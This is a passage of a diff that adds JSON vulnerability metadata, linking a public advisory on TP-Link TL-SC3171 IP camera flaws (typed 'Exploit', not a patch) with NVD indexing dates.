+                        "nvd-indexed": "02-Oct-2013",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras",
+                    "type": "Exploit",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "02-Oct-2013",
+                        "nvd-updated": "NA"
+                    }
+                }
+            }
+        }
+    }
+}
